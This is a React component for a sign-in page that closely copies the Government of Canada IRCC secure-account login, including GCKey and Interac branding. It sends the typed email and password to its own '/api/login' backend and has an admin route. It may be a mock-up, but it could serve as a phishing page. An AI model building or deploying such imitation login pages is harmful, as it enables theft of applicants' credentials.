import React, { useState } from 'react';
import { useNavigate } from 'react-router-dom';
import { useApp } from '../context/AppContext';
import { AlertCircle, Key, Landmark, UserPen, ChevronRight } from 'lucide-react';

export default function Login() {
  const { login } = useApp();
  const navigate = useNavigate();

  // Input states
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [errorLine, setErrorLine] = useState('');
  const [showForm, setShowForm] = useState(false);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setErrorLine('');

    if (!email.trim() || !password.trim()) {
      setErrorLine('Please complete all required fields.');
      return;
    }

    try {
      const res = await fetch('/api/login', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ email: email.trim(), password })
      });

      const data = await res.json();

      if (!res.ok) {
        setErrorLine(data.error || 'Authentication failed');
        return;
      }

      // Log the user into Context memory
      login(data.email, data.name || email.split('@')[0], data.dateCreated, data.timeCreated);
      if (data.email.toLowerCase() === 'admin@canada.ca') {
        navigate('/admin');
      } else {
        navigate('/dashboard');
      }
    } catch (err) {
      setErrorLine('Network error occurred.');
    }
  };

  return (
    <main className="mx-auto max-w-[800px] w-full px-4 py-6 flex-grow font-sans text-[#333]">
      
      {/* Top Breadcrumb */}
      <div className="flex text-[13px] mb-8 text-[#284162]">
        <span className="underline cursor-pointer">Canada.ca</span> 
        <span className="no-underline text-gray-500 mx-2">&gt;</span> 
        <span className="underline cursor-pointer">Immigration and citizenship</span>
      </div>
      
      <div className="flex text-[13px] mb-6 text-[#284162]">
        <span className="no-underline text-gray-500 mr-2">&gt;</span> 
        <span className="underline cursor-pointer">Your IRCC application</span>
      </div>

      <h1 className="text-[28px] font-medium text-[#333] mb-1">Sign in</h1>
      <h2 className="text-[36px] font-bold text-[#333] mb-4 tracking-tight leading-tight">IRCC secure account</h2>
      <div className="w-12 h-1 bg-[#d3080c] mb-6"></div>

      <p className="text-[19px] mb-4">We have different accounts for some applications.</p>
      <p className="text-[19px] mb-10">
        <strong>You may need a different account to apply</strong> , depending on the application you submit.
      </p>

      <h2 className="text-[32px] font-bold text-[#333] mb-6 tracking-tight leading-tight">Check if this is the right account for you</h2>

      {/* Accordions */}
      <div className="space-y-[-1px] mb-8 border border-gray-300 rounded">
        <button className="w-full flex items-center p-3 text-left bg-[#f5f5f5] hover:bg-gray-200 border-b border-gray-300 text-[17px] text-[#284162]">
          <span className="w-0 h-0 border-t-[5px] border-t-transparent border-l-[8px] border-l-[#284162] border-b-[5px] border-b-transparent mr-2 inline-block"></span>
          <strong>Apply</strong>&nbsp;for these applications
        </button>
        <button className="w-full flex items-center p-3 text-left bg-[#f5f5f5] hover:bg-gray-200 border-b border-gray-300 text-[17px] text-[#284162]">
          <span className="w-0 h-0 border-t-[5px] border-t-transparent border-l-[8px] border-l-[#284162] border-b-[5px] border-b-transparent mr-2 inline-block"></span>
          <strong>Check the status</strong>&nbsp;of these applications
        </button>
        <button className="w-full flex items-center p-3 text-left bg-[#f5f5f5] hover:bg-gray-200 text-[17px] text-[#284162]">
          <span className="w-0 h-0 border-t-[5px] border-t-transparent border-l-[8px] border-l-[#284162] border-b-[5px] border-b-transparent mr-2 inline-block"></span>
          <strong>Upload requested documents</strong>&nbsp;for these applications
        </button>
      </div>

      {/* Alert Box */}
      <div className="bg-[#d9edf7] border border-[#bce8f1] p-6 mb-10 flex flex-col items-center">
        <div className="w-10 h-10 bg-[#333] rounded-full text-white font-bold text-2xl flex items-center justify-center mb-6">!</div>
        
        <div className="w-full space-y-[-1px] border border-[#bce8f1] bg-[#d9edf7]">
          <button className="w-full flex items-center p-3 text-left hover:bg-[#c4e3f3] border-b border-[#bce8f1] text-[17px] text-[#284162]">
            <span className="w-0 h-0 border-t-[5px] border-t-transparent border-l-[8px] border-l-[#284162] border-b-[5px] border-b-transparent mr-2 inline-block"></span>
            Study permit applicants
          </button>
          <button className="w-full flex items-center p-3 text-left hover:bg-[#c4e3f3] border-b border-[#bce8f1] text-[17px] text-[#284162]">
            <span className="w-0 h-0 border-t-[5px] border-t-transparent border-l-[8px] border-l-[#284162] border-b-[5px] border-b-transparent mr-2 inline-block"></span>
            Delays with the status of your medical exam results
          </button>
          <button className="w-full flex items-center p-3 text-left hover:bg-[#c4e3f3] text-[17px] text-[#284162]">
            <span className="w-0 h-0 border-t-[5px] border-t-transparent border-l-[8px] border-l-[#284162] border-b-[5px] border-b-transparent mr-2 inline-block"></span>
            Student Direct Stream <span className="ml-2 bg-[#fbe7e9] text-[#d3080c] text-[12px] font-bold px-1.5 py-0.5 border-l-2 border-[#d3080c]">Closed</span>
          </button>
        </div>
      </div>

      {/* Sign in Box */}
      <div className="border border-gray-300 p-6 md:p-8 bg-white mb-10">
        <h2 className="text-[28px] font-bold text-[#333] mb-6">Sign in</h2>
        
        <div className="space-y-4">
          <button 
            onClick={() => setShowForm(!showForm)}
            className="w-full bg-[#26374a] hover:bg-[#1c2938] text-white flex items-stretch font-bold text-[17px] rounded transition-colors overflow-hidden"
          >
            <div className="bg-[#1c2938] p-3 flex items-center justify-center border-r border-[#3a4c61]">
              <Key className="w-5 h-5 text-white shrink-0" />
            </div>
            <div className="flex-grow p-3 flex items-center justify-center">
              GCKey username and password
            </div>
          </button>

          {showForm && (
            <div className="bg-gray-50 border border-gray-200 p-6 rounded my-4">
              <form onSubmit={handleSubmit} className="space-y-4">
                {errorLine && (
                  <div className="p-3 bg-[#fbe7e9] border-l-4 border-[#d3080c] text-sm text-[#333] flex items-start gap-2">
                    <AlertCircle className="w-5 h-5 text-[#d3080c] shrink-0" />
                    <span>{errorLine}</span>
                  </div>
                )}

                <div className="space-y-2">
                  <label className="text-[17px] font-bold text-[#333] block">Email Address (Username)</label>
                  <input
                    type="email"
                    value={email}
                    onChange={(e) => setEmail(e.target.value)}
                    className="w-full border border-gray-500 p-2 text-base text-[#333] outline-none focus:border-blue-600 focus:ring-1 focus:ring-blue-600 rounded"
                  />
                </div>

                <div className="space-y-2 block">
                  <label className="text-[17px] font-bold text-[#333] block">Password</label>
                  <input
                    type="password"
                    value={password}
                    onChange={(e) => setPassword(e.target.value)}
                    className="w-full border border-gray-500 p-2 text-base text-[#333] outline-none focus:border-blue-600 focus:ring-1 focus:ring-blue-600 rounded"
                  />
                </div>

                <button
                  type="submit"
                  className="bg-[#284162] hover:bg-[#1d5b90] text-white text-[17px] font-bold py-2 px-6 rounded transition-colors"
                >
                  Sign In
                </button>
              </form>
            </div>
          )}

          <button className="w-full bg-[#26374a] hover:bg-[#1c2938] text-white flex items-stretch font-bold text-[17px] rounded transition-colors overflow-hidden">
            <div className="bg-[#1c2938] p-3 flex items-center justify-center border-r border-[#3a4c61]">
              <Landmark className="w-5 h-5 text-white shrink-0" />
            </div>
            <div className="flex-grow p-3 flex items-center justify-center">
              Canadian <em>Interac</em>® Sign-In Partner
            </div>
          </button>
          
          <button className="w-full border border-gray-300 p-3 flex items-center text-[#284162] hover:bg-gray-100 text-[17px]">
            <span className="w-0 h-0 border-t-[5px] border-t-transparent border-l-[8px] border-l-[#284162] border-b-[5px] border-b-transparent mr-2 inline-block"></span>
            Not sure how to sign in?
          </button>
        </div>

        <div className="flex items-center my-8">
          <hr className="flex-grow border-gray-300" />
          <span className="px-3 text-[17px] text-gray-600 border border-gray-300 rounded-full w-10 h-10 flex items-center justify-center bg-white">or</span>
          <hr className="flex-grow border-gray-300" />
        </div>

        <h2 className="text-[28px] font-bold text-[#333] mb-4">Create an account</h2>
        <button className="w-full bg-[#eaebed] hover:bg-[#d8d9db] text-[#333] flex items-stretch font-bold text-[17px] rounded border border-[#dcdee1] transition-colors overflow-hidden">
          <div className="bg-[#dcdedf] p-3 flex items-center justify-center border-r border-[#dcdee1]">
            <UserPen className="w-5 h-5 text-[#333] shrink-0" />
          </div>
          <div className="flex-grow p-3 flex items-center justify-center">
            Register for an account
          </div>
        </button>
      </div>

      <h2 className="text-[32px] font-bold text-[#333] mb-6 tracking-tight leading-tight">Help with your account</h2>
      
      <div className="space-y-[-1px] mb-12 border border-gray-300 rounded">
        {['Errors and issues when you sign in', 'You forgot your GCKey password or username', 'GCKey two-factor authentication', 'GCKey revoked', 'Change your Sign-In Partner', 'If you don\'t find your application in your account', 'If your personal reference code doesn\'t work', 'More help options'].map((text, idx) => (
          <button key={idx} className="w-full flex items-center p-3 text-left bg-[#f5f5f5] hover:bg-gray-200 border-b border-gray-300 text-[17px] text-[#284162]">
            <span className="w-0 h-0 border-t-[5px] border-t-transparent border-l-[8px] border-l-[#284162] border-b-[5px] border-b-transparent mr-2 inline-block shrink-0"></span>
            {text}
          </button>
        ))}
      </div>

      <h2 className="text-[28px] font-bold text-[#333] mb-4">Find another government account</h2>
      <a href="#" className="text-[19px] text-[#284162] underline font-bold block mb-2 hover:text-[#1d5b90]">All Government of Canada online accounts</a>
      <p className="text-[19px] text-[#333] mb-12">
        There are many accounts across the Government of Canada for different services. Find the service you need.
      </p>

      {/* Did you find what you were looking for? */}
      <div className="bg-[#f5f5f5] border border-gray-300 p-6 flex flex-col items-center justify-center gap-4 mb-8">
        <span className="font-bold text-[17px]">Did you find what you were looking for?</span>
        <div className="flex gap-2">
          <button className="bg-[#26374a] text-white px-4 py-2 font-bold rounded hover:bg-[#1c2938]">Yes</button>
          <button className="bg-[#26374a] text-white px-4 py-2 font-bold rounded hover:bg-[#1c2938]">No</button>
        </div>
      </div>

    </main>
  );
}

